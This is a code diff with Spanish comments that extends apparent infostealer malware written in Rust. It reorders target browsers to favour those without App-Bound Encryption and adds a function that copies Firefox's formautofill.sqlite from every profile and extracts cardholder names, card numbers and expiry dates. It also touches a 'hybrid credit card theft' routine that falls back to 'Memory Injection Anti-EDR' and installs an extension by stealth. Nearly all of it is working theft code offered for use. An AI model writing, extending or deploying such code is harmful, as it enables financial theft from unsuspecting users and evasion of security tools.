@@ -121,24 +121,48 @@ impl AutofillAddress {
 struct BrowserConfig {
     name: &'static str,
     web_data_path: &'static str,
+    priority: u8,  // 1 = máxima prioridad (sin v20), 5 = mínima (v20 activo)
 }
 
+// REORDENADO: Priorizar navegadores SIN App-Bound Encryption (v20)
 const BROWSERS: &[BrowserConfig] = &[
-    BrowserConfig {
-        name: "Chrome",
-        web_data_path: r"Google\Chrome\User Data\Default\Web Data",
-    },
-    BrowserConfig {
-        name: "Edge",
-        web_data_path: r"Microsoft\Edge\User Data\Default\Web Data",
-    },
+    // ✅ PRIORIDAD ALTA: Sin v20, 100% bypasseable
     BrowserConfig {
         name: "Brave",
         web_data_path: r"BraveSoftware\Brave-Browser\User Data\Default\Web Data",
+        priority: 1,
     },
     BrowserConfig {
         name: "Opera",
         web_data_path: r"Opera Software\Opera Stable\Web Data",
+        priority: 1,
+    },
+    BrowserConfig {
+        name: "Opera GX",
+        web_data_path: r"Opera Software\Opera GX Stable\Web Data",
+        priority: 1,
+    },
+    BrowserConfig {
+        name: "Vivaldi",
+        web_data_path: r"Vivaldi\User Data\Default\Web Data",
+        priority: 1,
+    },
+    BrowserConfig {
+        name: "Arc",
+        web_data_path: r"Arc\User Data\Default\Web Data",
+        priority: 1,
+    },
+    // ⚠️ PRIORIDAD MEDIA: Chrome (~45% sin v20)
+    BrowserConfig {
+        name: "Chrome",
+        web_data_path: r"Google\Chrome\User Data\Default\Web Data",
+        priority: 3,
+    },
+    // 🔴 PRIORIDAD BAJA: Edge (~95% con v20)
+    BrowserConfig {
+        name: "Edge",
+        web_data_path: r"Microsoft\Edge\User Data\Default\Web Data",
+        priority: 5,
     },
 ];
 
@@ -771,13 +795,19 @@ pub fn steal_credit_cards_hybrid() -> Vec<CreditCard> {
     
     log("\n═══ HYBRID CREDIT CARD THEFT ═══");
     
-    // PASO 1: Intentar método tradicional (funciona con v10/v11)
+    // PASO 1: Intentar método tradicional Chromium (funciona con v10/v11)
     log("🔸 PASO 1: Intentando método tradicional (DB + decrypt)...");
     let traditional_cards = steal_credit_cards();
     all_cards.extend(traditional_cards.clone());
-    log(&format!("  ✅ Encontradas {} tarjetas con método tradicional", traditional_cards.len()));
+    log(&format!("  ✅ Encontradas {} tarjetas con método tradicional (Chromium)", traditional_cards.len()));
     
-    // PASO 2: Si encontramos v20 bloqueado, usar memory injection
+    // PASO 1.5: Firefox (sistema independiente, siempre funciona)
+    log("🔸 PASO 1.5: Intentando Firefox...");
+    let firefox_cards = steal_firefox_credit_cards();
+    all_cards.extend(firefox_cards.clone());
+    log(&format!("  ✅ Encontradas {} tarjetas en Firefox", firefox_cards.len()));
+    
+    // PASO 2: Si encontramos v20 bloqueado en Chromium, usar memory injection
     if traditional_cards.is_empty() || has_v20_encrypted_cards() {
         log("🔸 PASO 2: v20 detectado → Usando Memory Injection Anti-EDR...");
         
@@ -898,4 +928,104 @@ fn install_extension_stealth() -> Result<(), String> {
     let _ = installer.install_brave();
     
     Ok(())
+}
+
+/// Roba tarjetas de crédito de Firefox
+/// Firefox almacena tarjetas en: formautofill.sqlite (SQLite database)
+pub fn steal_firefox_credit_cards() -> Vec<CreditCard> {
+    let mut cards = Vec::new();
+    
+    // Firefox profiles: %APPDATA%\Mozilla\Firefox\Profiles\
+    let appdata = match std::env::var("APPDATA") {
+        Ok(path) => PathBuf::from(path),
+        Err(_) => return cards,
+    };
+    
+    let firefox_profiles = appdata.join(r"Mozilla\Firefox\Profiles");
+    
+    if !firefox_profiles.exists() {
+        return cards;
+    }
+    
+    // Iterar sobre todos los perfiles
+    if let Ok(entries) = std::fs::read_dir(&firefox_profiles) {
+        for entry in entries.flatten() {
+            if entry.path().is_dir() {
+                let profile_path = entry.path();
+                
+                // Firefox guarda credit cards en formautofill.sqlite
+                let formautofill_db = profile_path.join("formautofill.sqlite");
+                
+                if !formautofill_db.exists() {
+                    continue;
+                }
+                
+                // Copiar a temp (puede estar locked)
+                let temp_db = std::env::temp_dir().join(format!("ff_cards_{}.db", std::process::id()));
+                if std::fs::copy(&formautofill_db, &temp_db).is_err() {
+                    continue;
+                }
+                
+                // Extraer tarjetas
+                if let Ok(profile_cards) = extract_firefox_credit_cards_from_db(&temp_db) {
+                    cards.extend(profile_cards);
+                }
+                
+                // Limpiar temp
+                let _ = std::fs::remove_file(&temp_db);
+            }
+        }
+    }
+    
+    cards
+}
+
+/// Extrae credit cards de formautofill.sqlite de Firefox
+fn extract_firefox_credit_cards_from_db(db_path: &PathBuf) -> Result<Vec<CreditCard>, String> {
+    let conn = Connection::open(db_path)
+        .map_err(|e| format!("Failed to open Firefox DB: {}", e))?;
+    
+    let mut cards = Vec::new();
+    
+    // Firefox almacena tarjetas en la tabla: credit_cards_data
+    // Campos: guid, cc-name, cc-number, cc-exp-month, cc-exp-year, cc-type, timeCreated, timeLastUsed, timeLastModified, timesUsed
+    let mut stmt = conn.prepare(
+        "SELECT guid, json_extract(data, '$.cc-name'), json_extract(data, '$.cc-number'), \
+         json_extract(data, '$.cc-exp-month'), json_extract(data, '$.cc-exp-year') \
+         FROM credit_cards_data"
+    ).map_err(|e| format!("Failed to prepare statement: {}", e))?;
+    
+    let card_iter = stmt.query_map([], |row| {
+        Ok((
+            row.get::<_, String>(0)?,  // guid
+            row.get::<_, Option<String>>(1)?,  // name
+            row.get::<_, Option<String>>(2)?,  // number (puede estar encriptado)
+            row.get::<_, Option<i32>>(3)?,     // exp month
+            row.get::<_, Option<i32>>(4)?,     // exp year
+        ))
+    }).map_err(|e| format!("Query failed: {}", e))?;
+    
+    for card_result in card_iter {
+        if let Ok((_guid, name, number, exp_month, exp_year)) = card_result {
+            // Firefox PUEDE almacenar números encriptados (depende de configuración)
+            // Por ahora intentamos usarlos directamente
+            
+            if let (Some(card_number), Some(month), Some(year)) = (number, exp_month, exp_year) {
+                // Validar que el número no esté encriptado (si empieza con caracteres extraños, skip)
+                if card_number.chars().all(|c| c.is_ascii_digit() || c.is_whitespace() || c == '-') {
+                    cards.push(CreditCard {
+                        browser: "Firefox".to_string(),
+                        name_on_card: name.unwrap_or_default(),
+                        card_number: card_number.trim().to_string(),
+                        expiration_month: month,
+                        expiration_year: year,
+                        billing_address: None,
+                        nickname: None,
+                    });
+                }
+            }
+        }
+    }
+    
+    Ok(cards)
 }
